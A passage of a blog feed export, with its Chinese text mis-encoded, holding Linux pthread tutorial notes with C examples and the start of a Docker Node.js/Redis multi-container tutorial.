è½»é‡çº§çš„è¿›ç¨‹ï¼Œæœ¬è´¨ä»æ˜¯è¿›ç¨‹ï¼ˆLinuxç¯å¢ƒä¸‹ï¼‰</p><p>è¿›ç¨‹ï¼šç‹¬ç«‹åœ°å€ç©ºé—´ï¼Œæ‹¥æœ‰PCB</p><p>çº¿ç¨‹ï¼šæœ‰ç‹¬ç«‹çš„PCBï¼Œä½†æ²¡æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´</p><p>åŒºåˆ«ï¼šåœ¨äºæ˜¯å¦å…±äº«åœ°å€ç©ºé—´</p><p>Linuxä¸‹</p><ul><li>çº¿ç¨‹ï¼šæœ€å°çš„æ‰§è¡Œå•ä½</li><li>è¿›ç¨‹ï¼šæœ€å°åˆ†é…èµ„æºå•ä½ï¼Œå¯çœ‹ç¨‹å¸ˆåªæœ‰ä¸€ä¸ªçº¿ç¨‹çš„è¿›ç¨‹</li></ul><h5 id="çº¿ç¨‹å…±äº«èµ„æº"><a href="#çº¿ç¨‹å…±äº«èµ„æº" class="headerlink" title="çº¿ç¨‹å…±äº«èµ„æº"></a>çº¿ç¨‹å…±äº«èµ„æº</h5><ul><li>æ–‡ä»¶æè¿°ç¬¦è¡¨</li><li>æ¯ç§ä¿¡å·çš„å¤„ç†æ–¹å¼</li><li>å½“å‰å·¥ä½œç›®å½•</li><li>ç”¨æˆ·IDå’Œç»„ID</li><li>å†…å­˜åœ°å€ç©ºé—´(.text/.data/.bss/heap/å…±äº«åº“)</li></ul><h5 id="çº¿ç¨‹éå…±äº«èµ„æº"><a href="#çº¿ç¨‹éå…±äº«èµ„æº" class="headerlink" title="çº¿ç¨‹éå…±äº«èµ„æº"></a>çº¿ç¨‹éå…±äº«èµ„æº</h5><ul><li>çº¿ç¨‹id</li><li>å¤„ç†å™¨ç°åœºå’Œæ ˆæŒ‡é’ˆ(å†…æ ¸æ ˆ)</li><li>ç‹¬ç«‹çš„æ ˆç©ºé—´(ç”¨æˆ·ç©ºé—´æ ˆ)</li><li>errnoå˜é‡</li><li>ä¿¡å·å±è”½å­—</li><li>è°ƒåº¦ä¼˜å…ˆçº§</li></ul><h5 id="çº¿ç¨‹ä¼˜ç¼ºç‚¹"><a href="#çº¿ç¨‹ä¼˜ç¼ºç‚¹" class="headerlink" title="çº¿ç¨‹ä¼˜ç¼ºç‚¹"></a>çº¿ç¨‹ä¼˜ç¼ºç‚¹</h5><p>ä¼˜ç‚¹ï¼šæé«˜ç¨‹åºå¹¶å‘æ€§ ï¼Œå¼€é”€å°ï¼Œæ•°æ®é€šä¿¡å…±äº«æ•°æ®æ–¹ä¾¿</p><p>ç¼ºç‚¹ï¼šåº“å‡½æ•°ï¼Œä¸ç¨³å®šï¼Œè°ƒè¯•ç¼–å†™å›°éš¾ï¼Œgdbä¸æ”¯æŒï¼Œå¯¹ä¿¡å·æ”¯æŒä¸å¥½</p><h4 id="çº¿ç¨‹æ§åˆ¶åŸè¯­"><a href="#çº¿ç¨‹æ§åˆ¶åŸè¯­" class="headerlink" title="çº¿ç¨‹æ§åˆ¶åŸè¯­"></a>çº¿ç¨‹æ§åˆ¶åŸè¯­</h4><h5 id="pthread-selfå‡½æ•°"><a href="#pthread-selfå‡½æ•°" class="headerlink" title="pthread_selfå‡½æ•°"></a>pthread_selfå‡½æ•°</h5><p>è·å–çº¿ç¨‹IDï¼Œå…¶ä½œç”¨å¯¹åº”è¿›ç¨‹ä¸­<code>getpid</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">pthread_t</span> <span class="title">pthread_self</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">è¿”å›å€¼</span><br><span class="line">  æˆåŠŸï¼š<span class="number">0</span></span><br><span class="line">  å¤±è´¥ï¼šæ— </span><br></pre></td></tr></table></figure><h5 id="pthread-createå‡½æ•°"><a href="#pthread-createå‡½æ•°" class="headerlink" title="pthread_createå‡½æ•°"></a>pthread_createå‡½æ•°</h5><p>åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ï¼Œå…¶ä½œç”¨å¯¹åº”è¿›ç¨‹ä¸­forkå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_create</span><span class="params">(<span class="keyword">pthread_t</span> *thread,<span class="keyword">const</span> <span class="keyword">pthread_attr_t</span> *attr,<span class="keyword">void</span>*(*start_routine)(<span class="keyword">void</span> *),<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">è¿”å›å€¼</span><br><span class="line">  æˆåŠŸï¼š<span class="number">0</span></span><br><span class="line">  å¤±è´¥ï¼šé”™è¯¯å·</span><br><span class="line">å‚æ•°</span><br><span class="line">  <span class="keyword">pthread_t</span>ï¼šå½“å‰Linuxä¸­å¯ç†è§£ä¸ºï¼š<span class="keyword">typedef</span> unsignd <span class="keyword">long</span> <span class="keyword">int</span> <span class="keyword">pthread_t</span></span><br><span class="line">  å‚æ•°<span class="number">1</span>ï¼šä¼ å‡ºå‚æ•°ï¼Œä¿å­˜ç³»ç»Ÿä¸ºæˆ‘ä»¬åˆ†é…å¥½çš„çº¿ç¨‹ID</span><br><span class="line">  å‚æ•°<span class="number">2</span>ï¼šé€šå¸¸ä¼ <span class="literal">NULL</span>ï¼Œè¡¨ç¤ºä½¿ç”¨çº¿ç¨‹é»˜è®¤å±æ€§ï¼Œè‹¥æƒ³ä½¿ç”¨å…·ä½“å±æ€§ä¹Ÿå¯ä»¥ä¿®æ”¹è¯¥å‚æ•°</span><br></pre></td></tr></table></figure><h5 id="åˆ›å»ºä¸€ä¸ªçº¿ç¨‹"><a href="#åˆ›å»ºä¸€ä¸ªçº¿ç¨‹" class="headerlink" title="åˆ›å»ºä¸€ä¸ªçº¿ç¨‹"></a>åˆ›å»ºä¸€ä¸ªçº¿ç¨‹</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"thread : pid = %d,tid = %lu\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="comment">//tid = pthread_self();</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"main : pid = %d,tid = %lu\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">int</span> ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"pthread_create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å¾ªç¯åˆ›å»ºå¤šä¸ªå­çº¿ç¨‹"><a href="#å¾ªç¯åˆ›å»ºå¤šä¸ªå­çº¿ç¨‹" class="headerlink" title="å¾ªç¯åˆ›å»ºå¤šä¸ªå­çº¿ç¨‹"></a>å¾ªç¯åˆ›å»ºå¤šä¸ªå­çº¿ç¨‹</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = (<span class="keyword">int</span>)arg;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"--I'm %dth thread: pid = %d,tid = %lu\n"</span>,i+<span class="number">1</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,ret;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,(<span class="keyword">void</span> *)i);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"pthread_create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">sleep(i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"main: I'm Main,pid = %d,tid = %lu\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pthread-exitå‡½æ•°"><a href="#pthread-exitå‡½æ•°" class="headerlink" title="pthread_exitå‡½æ•°"></a>pthread_exitå‡½æ•°</h5><p>å°†å•ä¸ªçº¿ç¨‹é€€å‡º</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pthread_exit</span><span class="params">(<span class="keyword">void</span> *retval)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">å‚æ•°ï¼šretvalè¡¨ç¤ºçº¿ç¨‹é€€å‡ºçŠ¶æ€ï¼Œé€šå¸¸ä¼ NULL</span><br></pre></td></tr></table></figure><p>ä¸¾ä¾‹ï¼Œä½¿ç”¨<code>pthread_exit</code>é€€å‡ºä¸»çº¿ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"thread : pid = %d,tid = %ld\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"main : pid = %d,tid = %ld\n"</span>,getpid(),pthread_self());</span><br><span class="line"><span class="keyword">int</span> ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">perror(<span class="string">"pthread_create error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">pthread_exit((<span class="keyword">void</span>*)<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pthread-joinå‡½æ•°"><a href="#pthread-joinå‡½æ•°" class="headerlink" title="pthread_joinå‡½æ•°"></a>pthread_joinå‡½æ•°</h5><p>é˜»å¡ç­‰å¾…çº¿ç¨‹é€€å‡ºï¼Œè·å–çº¿ç¨‹é€€å‡ºçŠ¶æ€ï¼Œå…¶ä½œç”¨å¯¹åº”è¿›ç¨‹ä¸­çš„<code>waitpid()</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_join</span><span class="params">(<span class="keyword">pthread_t</span> thread,<span class="keyword">void</span> **retval)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  æˆåŠŸï¼š0</span><br><span class="line">  å¤±è´¥ï¼šé”™è¯¯å·</span><br><span class="line"></span><br><span class="line">å‚æ•°</span><br><span class="line">  threadï¼šçº¿ç¨‹ID</span><br><span class="line">  retvalï¼šå­˜å‚¨çº¿ç¨‹ç»“æŸçŠ¶æ€</span><br></pre></td></tr></table></figure><p>å¯¹æ¯”è®°å¿†</p><ul><li>è¿›ç¨‹ä¸­ <code>main</code>è¿”å›å€¼ã€<code>exit</code>å‚æ•°â€”&gt;<code>int</code>ï¼›ç­‰å¾…å­è¿›ç¨‹ç»“æŸ <code>wait</code> å‡½æ•°å‚æ•°â€”&gt;<code>int *</code></li><li>çº¿ç¨‹ä¸­ çº¿ç¨‹ä¸»å‡½æ•°è¿”å›å€¼ã€<code>pthread_exit</code>â€”&gt;<code>void *</code>;ç­‰å¾…çº¿ç¨‹ç»“æŸ <code>pthread_jion</code> å‡½æ•°å‚æ•°â€”&gt;<code>void **</code></li></ul><p>ä½¿ç”¨pthread_joinè·å–å­çº¿ç¨‹è¿”å›å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thrd</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> var;</span><br><span class="line"><span class="keyword">char</span> str[<span class="number">256</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">tfn</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thrd</span> *<span class="title">tval</span>;</span></span><br><span class="line">tval = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(tval));</span><br><span class="line">tval-&gt;var = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(tval-&gt;str,<span class="string">"hello thread"</span>);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span>*)tval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thrd</span> *<span class="title">retval</span>;</span></span><br><span class="line">ret = pthread_create(&amp;tid,<span class="literal">NULL</span>,tfn,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"pthread_create error"</span>);</span><br><span class="line">ret = pthread_join(tid,(<span class="keyword">void</span>**)&amp;retval);</span><br><span class="line"><span class="keyword">if</span>(ret != <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"pthread_join error"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child thread exit with var=%d,str=%s\n"</span>,retval-&gt;var,retval-&gt;str);</span><br><span class="line">pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pthread-cancelå‡½æ•°"><a href="#pthread-cancelå‡½æ•°" class="headerlink" title="pthread_cancelå‡½æ•°"></a>pthread_cancelå‡½æ•°</h5><p>æ€æ­»ä¸€ä¸ªçº¿ç¨‹ï¼Œéœ€è¦åˆ°è¾¾å–æ¶ˆç‚¹ï¼Œå¦‚æœå­çº¿ç¨‹æ²¡æœ‰åˆ°è¾¾å–æ¶ˆç‚¹ï¼Œé‚£ä¹ˆ<code>pthread_cancel</code>æ— æ•ˆï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºä¸­ï¼Œæ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªå–æ¶ˆç‚¹ï¼Œä½¿ç”¨<code>pthread_testcancel()</code>ï¼ŒæˆåŠŸè¢«<code>pthread_cancel()</code>æ€æ­»çš„çº¿ç¨‹ï¼Œè¿”å›<code>-1</code>ï¼Œå¯ä»¥ä½¿ç”¨<code>pthread_join</code>å›æ”¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_cancel</span><span class="params">(<span class="keyword">pthread_t</span> thread)</span></span></span><br></pre></td></tr></table></figure><h5 id="pthread-detachå‡½æ•°"><a href="#pthread-detachå‡½æ•°" class="headerlink" title="pthread_detachå‡½æ•°"></a>pthread_detachå‡½æ•°</h5><p>è®¾ç½®çº¿ç¨‹åˆ†ç¦»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_detach</span><span class="params">(<span class="keyword">pthread_t</span> thread)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">è¿”å›å€¼ï¼š</span><br><span class="line">  æˆåŠŸï¼š<span class="number">0</span></span><br><span class="line">  å¤±è´¥ï¼šerrno</span><br><span class="line">  </span><br><span class="line">thread:å¾…åˆ†ç¦»çš„çº¿ç¨‹id</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ä¿¡å·&quot;&gt;&lt;a href=&quot;#ä¿¡å·&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡å·&quot;&gt;&lt;/a&gt;ä¿¡å·&lt;/h4&gt;&lt;h5 id=&quot;ä¿¡å·æ¦‚å¿µ&quot;&gt;&lt;a href=&quot;#ä¿¡å·æ¦‚å¿µ&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡å·æ¦‚å¿µ&quot;&gt;&lt;/a&gt;ä¿¡å·æ¦‚å¿µ&lt;/h
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ</title>
    <link href="elssm.github.io/2021/10/11/Docker%E6%9E%84%E5%BB%BA%E5%A4%9A%E5%AE%B9%E5%99%A8%E5%BA%94%E7%94%A8%E6%A0%88/"/>
    <id>elssm.github.io/2021/10/11/Dockeræ„å»ºå¤šå®¹å™¨åº”ç”¨æ ˆ/</id>
    <published>2021-10-11T07:37:25.000Z</published>
    <updated>2021-12-13T09:44:53.813Z</updated>
    
    <content type="html"><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œéœ€è¦åšçš„æ˜¯æŠŠä¸€ä¸ªä½¿ç”¨<code>Express</code>æ¡†æ¶çš„å¹¶ä¸”å¸¦æœ‰<code>Redis</code>åç«¯çš„<code>Node.js</code>åº”ç”¨å®Œå…¨DockeråŒ–ã€‚ç›®çš„æ˜¯èƒ½å¤Ÿå°†Dockerçš„ç‰¹æ€§ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚ä¸»è¦çš„å·¥ä½œå†…å®¹æ˜¯</p><ul><li>ä¸€ä¸ªNodeå®¹å™¨ï¼Œç”¨æ¥æœåŠ¡äºNodeåº”ç”¨</li><li>ä¸€ä¸ªRedisä¸»å®¹å™¨ï¼Œç”¨äºä¿å­˜å’Œé›†ç¾¤åŒ–åº”ç”¨çŠ¶æ€</li><li>ä¸¤ä¸ªRediså‰¯æœ¬å®¹å™¨ï¼Œç”¨äºé›†ç¾¤åŒ–åº”ç”¨çŠ¶æ€</li><li>ä¸€ä¸ªæ—¥å¿—å®¹å™¨ï¼Œç”¨äºæ•è·åº”ç”¨æ—¥å¿—</li></ul><p>æœ€ç»ˆæˆ‘ä»¬çš„Nodeåº”ç”¨ç¨‹åºä¼šè¿è¡Œåœ¨ä¸€ä¸ªå®¹å™¨ä¸­ï¼Œå®ƒåé¢ä¼šæœ‰ä¸€ä¸ªé…ç½®ä¸ºâ€ä¸»-å‰¯æœ¬â€æ¨¡å¼è¿è¡Œåœ¨å¤šä¸ªå®¹å™¨ä¸­çš„Redisé›†ç¾¤ã€‚</p><h4 id="Node-jsé•œåƒ"><a href="#Node-jsé•œåƒ" class="headerlink" title="Node.jsé•œåƒ"></a>Node.jsé•œåƒ</h4><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä¸ªå®‰è£…äº†Node.jsçš„é•œåƒã€‚è¿™ä¸ªé•œåƒæœ‰Expressåº”ç”¨å’Œç›¸åº”çš„å¿…è¦çš„è½¯ä»¶åŒ…ã€‚</p><p>ç¬¬ä¸€æ­¥å…ˆåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªåä¸º<code>nodejs</code>çš„æ–‡ä»¶å¤¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir nodejs &amp;&amp; cd nodejs</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥åœ¨<code>nodejs</code>æ–‡ä»¶å¤¹ä¸‹åˆ›å»ºä¸€ä¸ªå­˜æ”¾<code>node.js</code>åº”ç”¨æºç çš„æ–‡ä»¶å¤¹åä¸º<code>nodeapp</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir nodeapp &amp;&amp; cd nodeapp</span><br></pre></td></tr></table></figure><p>è·å–<code>node.js</code>æºç </p><p>å¦‚æœä¸‹è½½ä¸ä¸‹æ¥çš„è¯ï¼Œä»£ç åœ°å€:<a 